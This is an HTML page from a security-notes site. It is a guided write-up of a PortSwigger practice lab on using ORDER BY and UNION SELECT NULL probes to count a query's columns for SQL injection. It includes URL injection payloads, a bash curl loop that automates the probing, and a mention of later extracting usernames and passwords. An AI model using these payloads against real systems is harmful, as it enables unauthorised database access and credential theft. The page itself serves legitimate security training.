@@ -1,0 +1,371 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Lab 03 — UNION Attack: Determine Number of Columns ☕</title>
+<link rel="stylesheet" href="../../../assets/styles.css" />
+</head>
+<body data-page-slug="lab-ps-sqli-03">
+
+<div class="progress-wrap"><div class="progress-bar" id="progressBar"></div></div>
+
+<div class="topbar">
+  <a class="logo" href="../../../index.html">☕ CYBERSEC.VAULT</a>
+  <nav>
+    <a href="../../../index.html">Home</a>
+    <a href="../../../index.html#topics-web">Topics</a>
+    <a href="../../../glossary/index.html">Glossary</a>
+    <a href="../../../tryhackme/index.html">THM</a>
+    <a href="../../../labs/portswigger/index.html" class="active">Labs</a>
+  </nav>
+  <div class="search-wrap">
+    <input type="text" class="search" placeholder="Search (press /)..." />
+    <div class="search-results"></div>
+  </div>
+</div>
+
+<div class="breadcrumb">
+  <a href="../../../index.html">Home</a>
+  <span class="sep">›</span>
+  <a href="../../../labs/portswigger/index.html">Labs</a>
+  <span class="sep">›</span>
+  <a href="../../../labs/portswigger/index.html">PortSwigger</a>
+  <span class="sep">›</span>
+  <a href="index.html">SQL Injection</a>
+  <span class="sep">›</span>
+  <span>Lab 03</span>
+</div>
+
+<!-- ===================== HERO ===================== -->
+<section class="hero" id="hero">
+  <div class="hero-content">
+    <span class="coffee-badge">☕ Lab 03 · Practitioner · the UNION setup</span>
+    <h1>UNION Attack — Count the Columns</h1>
+    <p class="subtitle">UNION is the cheat code for SQLi. It lets you glue YOUR query onto the developer's query.<br>But first, you need to know <strong>how many columns the original returns</strong>. That's this lab.</p>
+    <div class="tagline">"Before you dump the database, you gotta count to N."</div>
+    <div class="track-progress" style="margin-top: 18px;">
+      <span>SQLi track</span>
+      <span class="dots">
+        <span class="dot done" title="Lab 1"></span>
+        <span class="dot done" title="Lab 2"></span>
+        <span class="dot current" title="Lab 3"></span>
+      </span>
+      <span>3 / 3</span>
+    </div>
+    <div style="margin-top: 14px;">
+      <span class="diff-badge practitioner">Practitioner</span>
+      <span style="font-family: var(--mono); font-size: 12px; color: var(--ink-dim); margin-left: 8px;">⏱ ~15 min · curl + browser</span>
+    </div>
+    <div style="margin-top: 20px;">
+      <a class="cta-btn" href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns" target="_blank" rel="noopener" style="text-decoration:none;">OPEN LAB ON PORTSWIGGER 🔗</a>
+    </div>
+  </div>
+</section>
+
+<!-- ===================== CHAPTER 01: REFRESHER ===================== -->
+<section class="chapter" id="refresher">
+  <div class="chapter-num">Chapter 01 // Refresher</div>
+  <h2><span class="emoji">🧠</span> What even IS a UNION attack?</h2>
+  <p class="lead"><code class="inline">UNION</code> is a legit SQL keyword that stacks the results of two <code class="inline">SELECT</code> statements into one big result set.</p>
+
+  <div class="code">
+<span class="kw">SELECT</span> name, price <span class="kw">FROM</span> products
+<span class="kw">UNION</span>
+<span class="kw">SELECT</span> username, password <span class="kw">FROM</span> users
+  </div>
+  <p style="margin-top: 12px;">The DB runs the first <code class="inline">SELECT</code>, then runs the second <code class="inline">SELECT</code>, and <strong>returns them as one table</strong>. This is how you exfiltrate data through a SQLi — you inject a second <code class="inline">SELECT</code> that pulls data from a table the developer never intended to show you.</p>
+
+  <div class="paper">
+    <h4>📝 The shared-tray rule</h4>
+    <p>Imagine the DB is a cafeteria server. The first <code class="inline">SELECT</code> is "I'll have 2 items: a sandwich and a price tag." So the DB grabs a tray with <span class="highlight">2 slots</span>.</p>
+    <p>If you try to UNION something that returns 3 items (username, password, email), the DB freaks out: <strong>"I've already committed to a 2-slot tray, I can't fit 3 things!"</strong> → ERROR.</p>
+    <p>So <strong>your UNION SELECT must return EXACTLY the same number of columns as the original</strong>. That's why we have to count first.</p>
+  </div>
+
+  <h3 style="margin-top: 22px;">🔑 Two rules of UNION attacks</h3>
+  <div class="grid cols-2">
+    <div class="card">
+      <h4>Rule 1 — column <em>count</em> must match</h4>
+      <p>The injected <code class="inline">SELECT</code> must return the same number of columns as the original. Mismatch = SQL error = no data.</p>
+    </div>
+    <div class="card">
+      <h4>Rule 2 — column <em>types</em> must be compatible</h4>
+      <p>(We'll tackle this in a future lab.) Each column's data type must be compatible in the same slot. Today we only solve Rule 1.</p>
+    </div>
+  </div>
+
+  <div class="brain-power" style="margin-top: 18px;">
+    <div class="label">🧠 Brain Power</div>
+    <div class="question">The original query is <code class="inline">SELECT * FROM products WHERE category = 'Gifts'</code>. Assume <code class="inline">products</code> has 8 columns. How many columns must my UNION SELECT have?</div>
+    <button class="reveal-btn" onclick="toggleAnswer(this)">Reveal answer</button>
+    <div class="answer">
+      <p><strong>8.</strong> Exactly matching. Because <code class="inline">SELECT *</code> unfolds to all 8 columns, and UNION requires matching column counts, your injected SELECT must return 8 values too.</p>
+      <p>This is what this lab is teaching: a systematic way to discover that number without guessing blind.</p>
+    </div>
+  </div>
+</section>
+
+<div class="divider">the mission</div>
+
+<!-- ===================== CHAPTER 02: MISSION ===================== -->
+<section class="chapter" id="mission">
+  <div class="chapter-num">Chapter 02 // Your Mission</div>
+  <h2><span class="emoji">🎯</span> What "solving" means</h2>
+  <p class="lead">Determine how many columns are being returned by the query behind the product-category filter. Submit the correct number as a UNION SELECT that <strong>doesn't error out</strong>. When you find it, the lab marks itself solved.</p>
+</section>
+
+<div class="divider">tools</div>
+
+<!-- ===================== CHAPTER 03: TOOLS ===================== -->
+<section class="chapter" id="tools">
+  <div class="chapter-num">Chapter 03 // Tools</div>
+  <h2><span class="emoji">🔧</span> Browser URL bar. Only.</h2>
+
+  <div class="grid cols-2">
+    <div class="card">
+      <h4>🌐 Browser URL bar</h4>
+      <p>Same injection point as Lab 1 — a URL parameter. You'll tweak one number at a time and watch the page either render products or return an error. Perfect feedback loop.</p>
+    </div>
+    <div class="card">
+      <h4>💻 curl (for automation if you want)</h4>
+      <p>We'll show a bash loop that probes all counts at once. Nice for practitioner-tier targets where you want to move fast.</p>
+    </div>
+  </div>
+</section>
+
+<div class="divider">the solve</div>
+
+<!-- ===================== CHAPTER 04: GUIDED SOLVE ===================== -->
+<section class="chapter" id="solve">
+  <div class="chapter-num">Chapter 04 // The Guided Solve</div>
+  <h2><span class="emoji">🛠️</span> Two techniques. Use either.</h2>
+  <p class="lead">There are <strong>two classic ways</strong> to find the column count. We'll cover both because different real-world apps react differently.</p>
+
+  <h3 style="margin-top: 14px;">🅰️ Technique A: <code class="inline">ORDER BY N</code> probing</h3>
+
+  <!-- STEP 1 -->
+  <div class="step" data-step="1">
+    <h4>Click any category, grab the URL <span class="tool-tag browser">browser</span></h4>
+    <p>You get:</p>
+    <div class="browser-bar">
+      <span class="dots"><span class="d r"></span><span class="d y"></span><span class="d g"></span></span>
+      <span class="lock">🔒</span>
+      <span class="url">https://YOUR_LAB/filter?<strong>category=Gifts</strong></span>
+    </div>
+    <div class="why"><strong>Why:</strong> same injection point as Lab 1. The <code class="inline">category</code> parameter goes straight into a WHERE clause.</div>
+  </div>
+
+  <!-- STEP 2 -->
+  <div class="step" data-step="2">
+    <h4>Inject <code class="inline">ORDER BY 1</code> <span class="tool-tag browser">browser</span></h4>
+    <p>Paste into the URL:</p>
+    <div class="browser-bar">
+      <span class="dots"><span class="d r"></span><span class="d y"></span><span class="d g"></span></span>
+      <span class="lock">🔒</span>
+      <span class="url">https://YOUR_LAB/filter?category=Gifts<span class="injection">'+ORDER+BY+1--</span></span>
+    </div>
+    <p>(Using <code class="inline">+</code> for spaces, URL-encoded.) Page loads normally. That tells you "yes, the query has at least 1 column."</p>
+    <div class="why"><strong>Why ORDER BY:</strong> it accepts a column <em>position</em> (1, 2, 3…). If you ask it to sort by column 9 and there are only 8, the DB throws an error. That's our oracle.</div>
+  </div>
+
+  <!-- STEP 3 -->
+  <div class="step" data-step="3">
+    <h4>Increment until it breaks <span class="tool-tag browser">browser</span></h4>
+    <p>Try <code class="inline">ORDER BY 2</code>, <code class="inline">ORDER BY 3</code>… one at a time:</p>
+    <div class="terminal">
+      <div class="tbar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="title">browser · request log</span></div>
+      <div class="tbody"><span class="out">?category=Gifts'+ORDER+BY+1--   → 200 OK (products render)
+?category=Gifts'+ORDER+BY+2--   → 200 OK
+?category=Gifts'+ORDER+BY+3--   → 200 OK
+?category=Gifts'+ORDER+BY+4--   → <span class="hl">500 Internal Server Error</span></span></div>
+    </div>
+    <p>3 works, 4 errors. So the query has <strong>3 columns</strong>.</p>
+    <div class="why"><strong>Why this is beautiful:</strong> no guesswork. You climb the staircase one step at a time until it collapses — the last safe step is your answer.</div>
+  </div>
+
+  <h3 style="margin-top: 30px;">🅱️ Technique B: <code class="inline">UNION SELECT NULL</code> probing</h3>
+
+  <!-- STEP 4 -->
+  <div class="step" data-step="4">
+    <h4>Inject increasing numbers of NULLs <span class="tool-tag browser">browser</span></h4>
+    <p>Try one NULL:</p>
+    <div class="browser-bar">
+      <span class="dots"><span class="d r"></span><span class="d y"></span><span class="d g"></span></span>
+      <span class="lock">🔒</span>
+      <span class="url">https://YOUR_LAB/filter?category=Gifts<span class="injection">'+UNION+SELECT+NULL--</span></span>
+    </div>
+    <p>Then two:</p>
+    <div class="code">
+?category=Gifts'+UNION+SELECT+NULL,NULL--
+    </div>
+    <p>Then three:</p>
+    <div class="code safe">
+?category=Gifts'+UNION+SELECT+NULL,NULL,NULL--
+    </div>
+    <p>The one that <strong>doesn't</strong> error is the correct column count. In this lab: <strong>3 NULLs works</strong>. Lab solves.</p>
+    <div class="why"><strong>Why NULL:</strong> it's compatible with every data type. So you sidestep Rule 2 (type mismatch) entirely and only test Rule 1 (count).</div>
+  </div>
+
+  <!-- STEP 5 -->
+  <div class="step" data-step="5">
+    <h4>(Bonus) Automate the count with curl <span class="tool-tag shell">shell</span></h4>
+    <p>Why try one at a time when bash can brute-force in 2 seconds?</p>
+    <div class="terminal">
+      <div class="tbar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="title">bash · ~/labs</span></div>
+      <div class="tbody"><span class="prompt">$ </span><span class="cmd">LAB="https://YOUR_LAB"
+for n in 1 2 3 4 5 6 7 8; do
+  nulls=$(printf 'NULL,%.0s' $(seq 1 $n) | sed 's/,$//')
+  code=$(curl -s -o /dev/null -w "%{http_code}" \
+    "$LAB/filter?category=Gifts%27%20UNION%20SELECT%20$nulls--%20")
+  echo "$n cols -> HTTP $code"
+done</span>
+<span class="out">1 cols -> HTTP 500
+2 cols -> HTTP 500
+3 cols -> HTTP <span class="hl">200</span>
+4 cols -> HTTP 500
+5 cols -> HTTP 500
+...</span></div>
+    </div>
+    <p>HTTP 200 on column count <strong>3</strong> = answer. Clean, reproducible, paste-able into a bounty report.</p>
+    <div class="why"><strong>Why automate:</strong> real targets may have 20+ columns. A bash loop scales linearly; manual URL edits do not.</div>
+  </div>
+</section>
+
+<div class="divider">dissection</div>
+
+<!-- ===================== CHAPTER 05: PAYLOAD DISSECTED ===================== -->
+<section class="chapter" id="dissect">
+  <div class="chapter-num">Chapter 05 // Payload Dissected</div>
+  <h2><span class="emoji">🔬</span> Anatomy of the winning URL</h2>
+
+  <div class="code">
+?category=<span class="str">Gifts</span><span class="inject">' UNION SELECT NULL,NULL,NULL--</span>
+  </div>
+
+  <div class="grid cols-3" style="margin-top: 18px;">
+    <div class="card">
+      <h4><code class="inline" style="color: var(--accent-2);">Gifts'</code></h4>
+      <p>Completes the original WHERE condition + closes the string. Same trick as Lab 1.</p>
+    </div>
+    <div class="card">
+      <h4><code class="inline" style="color: var(--accent-2);">UNION SELECT</code></h4>
+      <p>Glues a new query onto the original. The DB returns both result sets stacked.</p>
+    </div>
+    <div class="card">
+      <h4><code class="inline" style="color: var(--accent-2);">NULL,NULL,NULL</code></h4>
+      <p>3 NULLs = 3 columns. Matches the original's column count. Compatible with any data type.</p>
+    </div>
+    <div class="card">
+      <h4><code class="inline" style="color: var(--accent-2);">-- </code></h4>
+      <p>Comments out anything left after our injection (like an <code class="inline">ORDER BY</code> or more conditions the dev added).</p>
+    </div>
+    <div class="card">
+      <h4>URL encoding</h4>
+      <p>Spaces become <code class="inline">+</code> or <code class="inline">%20</code>. Apostrophes can be <code class="inline">%27</code> or left raw (browser tolerates both).</p>
+    </div>
+    <div class="card">
+      <h4>The error code</h4>
+      <p><strong>500</strong> = wrong column count. <strong>200</strong> = you found it. Your signal-to-noise ratio.</p>
+    </div>
+  </div>
+
+  <div class="callout success" style="margin-top: 20px;">
+    <strong>💡 Why this lab matters so much:</strong> every future UNION-based SQLi lab starts with "first, count the columns." You just learned the foundational step that unlocks <em>all</em> of UNION-based data exfiltration.
+  </div>
+</section>
+
+<div class="divider">real world</div>
+
+<!-- ===================== CHAPTER 06: REAL WORLD ===================== -->
+<section class="chapter" id="real">
+  <div class="chapter-num">Chapter 06 // Real-world</div>
+  <h2><span class="emoji">💰</span> UNION attacks in the wild</h2>
+
+  <div class="grid cols-2">
+    <div class="card">
+      <h4>🗞️ Classic news sites, forums, e-commerce</h4>
+      <p>Older PHP/MySQL apps are full of UNION-SQLi. Entire databases have been dumped over the years using this exact technique. Every major breach of the 2010s that started with SQLi used some variant of UNION or Blind SQLi.</p>
+    </div>
+    <div class="card">
+      <h4>🛠️ sqlmap automates this</h4>
+      <p>The famous tool <code class="inline">sqlmap</code> does what you just did — automatically. Under the hood, its first move on a UNION-capable injection is: count columns via ORDER BY or NULL probing. Now you know why.</p>
+    </div>
+  </div>
+
+  <div class="callout info">
+    <strong>🔭 What's next after column count:</strong> finding which columns render as text in the page (so you can exfiltrate visible data), then SELECTing <code class="inline">username, password</code> from the users table. That's the full UNION-SQLi kill chain. We'll tackle those in the next track batch.
+  </div>
+</section>
+
+<div class="divider">test yourself</div>
+
+<!-- ===================== CHAPTER 07: QUIZ ===================== -->
+<section class="chapter" id="quiz">
+  <div class="chapter-num">Chapter 07 // Retention Quiz</div>
+  <h2><span class="emoji">🎯</span> Did it stick?</h2>
+
+  <div class="quiz">
+    <h4>🧠 Why do we use <code class="inline">NULL</code> in UNION probes instead of <code class="inline">'a'</code> or <code class="inline">1</code>?</h4>
+    <div class="q">Think about the two UNION rules.</div>
+    <div class="options">
+      <div class="opt" onclick="quizAnswer(this, false)">Because NULL is shorter to type</div>
+      <div class="opt" onclick="quizAnswer(this, true)">Because NULL is compatible with every column data type, so type mismatches don't confuse our column-count results</div>
+      <div class="opt" onclick="quizAnswer(this, false)">Because NULL is always true in SQL</div>
+      <div class="opt" onclick="quizAnswer(this, false)">Because NULL bypasses WAFs</div>
+    </div>
+    <div class="feedback"></div>
+  </div>
+
+  <div class="quiz" style="margin-top: 24px;">
+    <h4>🧠 You try <code class="inline">UNION SELECT NULL,NULL</code> and get 500. Then <code class="inline">UNION SELECT NULL,NULL,NULL</code> and get 200. What do you now know?</h4>
+    <div class="q">Be precise.</div>
+    <div class="options">
+      <div class="opt" onclick="quizAnswer(this, false)">The database is MySQL</div>
+      <div class="opt" onclick="quizAnswer(this, true)">The original query returns 3 columns</div>
+      <div class="opt" onclick="quizAnswer(this, false)">The admin password is 3 characters long</div>
+      <div class="opt" onclick="quizAnswer(this, false)">The table has 3 rows</div>
+    </div>
+    <div class="feedback"></div>
+  </div>
+</section>
+
+<!-- ===================== NEXT LAB ===================== -->
+<section class="chapter" id="next">
+  <div class="lab-nav">
+    <a href="02-login-bypass.html">
+      <span class="dir">← Lab 02</span>
+      <span class="title">Login Bypass</span>
+    </a>
+    <a class="next" href="index.html">
+      <span class="dir">Track complete 🏆</span>
+      <span class="title">Back to SQLi Track</span>
+    </a>
+  </div>
+
+  <div class="callout success" style="margin-top: 26px; text-align: center;">
+    <strong>🎉 You just finished the first SQLi track.</strong> 3 labs down. You now know the core SQLi moves: string-break, comment-kill, and UNION setup. More labs in this track coming soon — tell the vault owner which ones you want next.
+  </div>
+</section>
+
+<!-- ===================== RELATED ===================== -->
+<section class="chapter">
+  <div class="related-terms">
+    <h4>🔗 Related in the vault</h4>
+    <div class="tags">
+      <a href="../../../topics/web/sql-injection/index.html">💉 SQL Injection (topic)</a>
+      <a href="../../../glossary/sql-comment.html">💬 SQL Comment</a>
+      <a href="../../../glossary/curl.html">💻 curl</a>
+      <a href="../../../labs/portswigger/sql-injection/index.html">📚 SQLi Track</a>
+    </div>
+  </div>
+</section>
+
+<footer class="site-foot">
+  <p class="coffee-line">Count the columns. Know the query. Own the database. ☕</p>
+</footer>
+
+<script src="../../../assets/glossary.js"></script>
+<script src="../../../assets/app.js"></script>
+</body>
+</html>
